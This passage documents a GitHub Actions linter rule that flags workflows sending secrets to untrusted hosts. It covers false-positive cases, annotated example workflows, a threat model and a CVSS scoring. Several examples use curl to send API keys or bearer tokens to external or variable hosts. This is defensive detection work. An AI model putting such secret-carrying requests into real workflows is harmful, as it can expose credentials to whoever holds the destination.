    #   secret API_KEY, which VirusTotal issued for this API.
    # reason: no harm: the destination is the service the key is for.
    # cause: the rule does not know the service of a key, and assumes the
    #   destination is not trusted until a file of facts says so
    #   (request.destination-trusted).
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: the request goes to VirusTotal as the key is meant
    #   to; only a breach of VirusTotal gives the key to another.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - shell: bash
            env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              curl -fsS -H "x-apikey: $API_KEY" https://www.virustotal.com/api/v3/files -F file=@dist/app.zip
    ```
- fork-pull-request: a job that runs only for a pull request from a fork (pull_request, pull_request_review or pull_request_review_comment, with an if such as github.event.pull_request.head.repo.fork == true or github.event.pull_request.head.repo.full_name != github.repository), in a base repository that is not a fork: the workflow run for a pull request from a fork has no secret except GITHUB_TOKEN, unless the settings of a private repository send secrets to such workflow runs (the fact repo.fork-pr-secrets), so a request that the job sends to a host (with curl, wget or gh api) carries an empty value in the place of a secret other than GITHUB_TOKEN; the rule does not distinguish a workflow run for a pull request from a fork from a workflow run for a pull request from a branch of the repository
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: same-file, fact)
  - example: fork-pull-request.yml (workflow, false-positive)
    ```yaml
    # situation: on pull_request, a job that runs only when the head repository
    #   of the pull request is a fork sends the value of secrets.DEPLOY_TOKEN
    #   with curl to a host that the variable DEPLOY_HOST names.
    # reason: in a base repository that is not a fork, the job runs only for a pull
    #   request from a fork, and such a workflow run has no secret except
    #   GITHUB_TOKEN, unless the settings of a private repository send secrets
    #   to the workflow runs for pull requests from forks (the fact
    #   repo.fork-pr-secrets); DEPLOY_TOKEN is empty, so the HTTP request that
    #   the job sends carries no secret to the host.
    # cause: the rule reads every workflow run of the event pull_request, and
    #   does not distinguish a workflow run for a pull request from a fork from
    #   a workflow run for a pull request from a branch of the repository.
    # attack: an attacker who operates the host that DEPLOY_HOST names reads
    #   the Authorization header of the HTTP request.
    # attack-run-behavior: a pull request from a branch of the repository does
    #   not start the job; a pull request from a fork starts the job, and curl
    #   sends Authorization: Bearer with an empty value.
    on: pull_request
    jobs:
      j:
        if: github.event.pull_request.head.repo.fork
        runs-on: ubuntu-latest
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        steps:
          - run: |
              curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ vars.DEPLOY_HOST }}/status"
    ```
- job-listener: a destination on the runner itself or in the job's network that only the job listens on, such as a server the job starts, on a runner that is not known to be GitHub's
  - finding kinds: secret-exfiltration.untrusted-destination
  - fact kinds:
    - request.destination-trusted (provider: user-supplied, answer that removes the finding: true)
  - example: job-listener.yml (workflow, false-positive)
    ```yaml
    # situation: on push, a job on a runner labelled linux.2xlarge starts a
    #   server on port 8080 and sends the secret API_KEY to the server with
    #   curl.
    # reason: no harm when the runner is one machine of the job: only the job's
    #   own server listens on the port.
    # cause: the rule reads a runner as GitHub's by its label, and linux.2xlarge
    #   is not one of GitHub's labels.
    # attack: the attacker leaves a process listening on port 8080 of the
    #   runner, in a job of the attacker's own on the same machine, if the
    #   machine is shared.
    # attack-run-behavior: on a machine of the job alone, the request goes to
    #   the job's own server.
    on: push
    jobs:
      j:
        runs-on: linux.2xlarge
        steps:
          - shell: bash
            env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              python3 -m http.server 8080 &
              curl -fsS -H "x-apikey: $API_KEY" http://localhost:8080/
    ```
- actions-not-allowed: a workflow whose run GitHub does not start, or a job that GitHub fails in the step "Set up job", because of the setting of allowed actions of GitHub (the fact repo.allowed-actions, which the quality rule allowed-actions reads): GitHub does not start a run of a workflow that has a uses, or that calls a reusable workflow that has a uses, that the setting does not allow, and fails a job before any step of the job runs when a step of a composite action that the job runs has a uses that the setting does not allow, or when the setting requires a full commit SHA and a step names an action by a tag or a branch. The harm that the finding reports happens only when GitHub runs the workflow or the job, and the rule does not read repo.allowed-actions
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: fact)
  - example: actions-not-allowed.yml (workflow, false-positive)
    ```yaml
    # situation: the workflow of the true positive untrusted-destination
    #   (untrusted-destination.yml) of the rule, with a job added whose step
    #   uses example-org/not-allowed-action, which the setting of allowed
    #   actions of GitHub (repo.allowed-actions) blocks with
    #   !example-org/not-allowed-action@*. In the true positive, on push, a step
    #   uploads a build to VirusTotal with curl and the secret API_KEY in a
    #   header; no file of facts answers for the pair.
    # reason: GitHub checks each uses of the workflow before the run starts, and
    #   does not start the run because of the uses of
    #   example-org/not-allowed-action: no job of the run runs, so what the
    #   reason of the true positive says does not happen (in runs that the
    #   authors of the rule made on GitHub, such runs ended as startup_failure).
    # cause: the rule does not read repo.allowed-actions.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: GitHub does not start the run, so no step of the run
    #   runs, and the attack does nothing.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - shell: bash
            env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              curl -fsS -H "x-apikey: $API_KEY" https://www.virustotal.com/api/v3/files -F file=@dist/app.zip
      not-allowed:
        runs-on: ubuntu-latest
        steps:
          - uses: example-org/not-allowed-action@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### threat

- precondition request-carries: the request carries its credentials to the host its URL names: curl sends -H, -u, --oauth2-bearer, cookies and the body there, and gh api sends GH_ENTERPRISE_TOKEN to any host not of GitHub
  - cites:
    - <https://github.com/curl/curl/blob/dc99e1274b2bb368dea509ac6694d34e93c50054/docs/cmdline-opts/header.md>
    - <https://github.com/cli/cli/blob/fa92838bef95fe4a29c1587693885d5e9bdb6cf1/pkg/cmd/api/http.go>
    - <https://github.com/cli/go-gh/blob/aadf36735579aa6ad2343b2e1b0f5387c22c71f0/pkg/auth/auth.go>
- precondition github-holds-secrets: GitHub decrypts the secrets to give them to the run, so a request to a host of GitHub gives GitHub nothing GitHub does not hold; the rule leaves out such a request, as it leaves out a service of the job and, on a GitHub-hosted runner, the runner itself (localhost), where only the job listens
  - cites:
    - <https://github.com/github/docs/blob/dae83f7d28f3b8e10015bd6b6d8b72267cedceca/content/actions/concepts/security/secrets.md>
- actor: destination-holder
  - via: runs the server of a destination the workflow names, or takes the server over
  - gains: read-secrets, write-with-token

### CVSS

#### secret-exfiltration.untrusted-destination

- vector: CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N/E:U
- CVSS-B: 9.4 (critical)
- CVSS-BT: 8.1 (high)
- impact: H (from VC, VI, SC, SI)
- likelihood: low (from AV:N, AT:P, PR:N; lowered by AC:H)
- severity: medium (impact H, likelihood low; the table: sisakulint --explain=terms)
- AV: N
  - reason: the server of the destination receives the request over the network
  - cites: none
- AC: H
  - reason: to hold the server of the destination, the attacker breaches the vendor or registers a lapsed domain
  - cites: none
- AT: P
  - reason: the finding holds when the destination is not to be trusted with the secret (request.destination-trusted false; a file of facts or --fact can answer true): the holder of the server is the attacker
  - cites: none
- PR: N
  - reason: nothing of the repository is needed
  - cites: none
- UI: N
  - reason: the workflow sends the request whenever it runs
  - cites: none
- VC: H
  - reason: the server receives the secret or the token the request carries
  - cites: none
- VI: H
  - reason: with the token, when the job's token can write, the holder writes to the repository while the job runs; a secret gives what the secret can write
  - cites: none
- VA: N
  - reason: the request makes nothing of the job unavailable as such
  - cites: none
- SC: H
  - reason: the secrets open what is past the job: clouds, registries, other repositories
  - cites: none
- SI: H
  - reason: with the secrets the holder writes to what they open
  - cites: none
- SA: N
  - reason: nothing past the job is made unavailable by this as such
  - cites: none
- E: U
  - reason: no report was found of a secret a workflow sent to a destination that its holder misused (searched 2026-10-19: the 43 findings of the upstream rule on 4,974 workflows of public repositories, none of which looked like a theft, and the issues and pull requests of sisakulint that ported the rule)
  - cites: none
